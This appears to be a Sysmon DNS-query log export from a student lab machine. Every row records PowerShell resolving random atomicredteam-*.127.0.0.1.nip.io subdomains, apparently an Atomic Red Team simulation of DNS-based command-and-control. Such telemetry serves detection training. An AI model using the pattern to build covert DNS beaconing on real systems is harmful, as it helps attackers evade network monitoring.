"2025-12-26 11:27:41.852 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174774,"Query: atomicredteam-919077.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:41.035","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:41.852 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174775,"Query: atomicredteam-175873.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:41.073","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:41.852 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174776,"Query: atomicredteam-443905.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:41.111","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:41.852 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174777,"Query: atomicredteam-636567.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:41.148","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:41.852 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174778,"Query: atomicredteam-303005.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:41.185","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:41.852 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174779,"Query: atomicredteam-768393.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:41.222","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:41.853 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174780,"Query: atomicredteam-898533.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:41.549","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:41.853 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174781,"Query: atomicredteam-123469.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:41.586","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:41.853 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174782,"Query: atomicredteam-58288.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:41.624","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:41.853 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174783,"Query: atomicredteam-795365.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:41.663","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:41.853 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174784,"Query: atomicredteam-59579.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:41.701","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:42.865 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174785,"Query: atomicredteam-378567.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:41.738","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:42.865 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174786,"Query: atomicredteam-524486.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:41.775","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:42.866 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174787,"Query: atomicredteam-227546.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:41.813","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:42.866 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174788,"Query: atomicredteam-284305.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:41.985","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:42.866 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174789,"Query: atomicredteam-776920.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:42.024","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:42.866 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174790,"Query: atomicredteam-248497.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:42.201","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:42.866 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174791,"Query: atomicredteam-13789.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:42.240","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:43.880 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174792,"Query: atomicredteam-974523.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:42.279","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:43.880 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174793,"Query: atomicredteam-602827.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:42.317","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:43.880 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174794,"Query: atomicredteam-900221.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:42.353","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:43.880 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174795,"Query: atomicredteam-77583.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:42.392","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:43.880 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174796,"Query: atomicredteam-678986.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:42.429","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:43.880 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174797,"Query: atomicredteam-637028.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:42.469","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:43.880 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174798,"Query: atomicredteam-324671.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:42.508","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:43.880 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174799,"Query: atomicredteam-42317.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:42.830","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:43.880 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174800,"Query: atomicredteam-952590.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:42.868","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:43.880 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174801,"Query: atomicredteam-634792.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:43.191","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:43.880 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174802,"Query: atomicredteam-826493.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:43.228","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:43.880 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174803,"Query: atomicredteam-251139.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:43.402","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:43.880 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174804,"Query: atomicredteam-749182.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:43.441","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:43.880 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174805,"Query: atomicredteam-231116.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:43.480","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:43.880 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174806,"Query: atomicredteam-816797.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:43.523","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.893 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174807,"Query: atomicredteam-327955.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:43.843","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.893 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174808,"Query: atomicredteam-156532.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:43.881","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.893 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174809,"Query: atomicredteam-191081.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:43.921","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.893 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174810,"Query: atomicredteam-49064.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:43.958","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.893 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174811,"Query: atomicredteam-492693.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.127","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.893 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174812,"Query: atomicredteam-585533.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.170","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.894 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174813,"Query: atomicredteam-815364.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.209","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.894 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174814,"Query: atomicredteam-409160.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.247","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.894 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174815,"Query: atomicredteam-663006.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.284","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.894 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174816,"Query: atomicredteam-151322.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.322","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.894 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174817,"Query: atomicredteam-667301.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.361","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.894 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174818,"Query: atomicredteam-959504.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.399","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.894 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174819,"Query: atomicredteam-607571.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.567","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.894 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174820,"Query: atomicredteam-46899.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.604","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:44.894 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174821,"Query: atomicredteam-852389.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:44.642","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
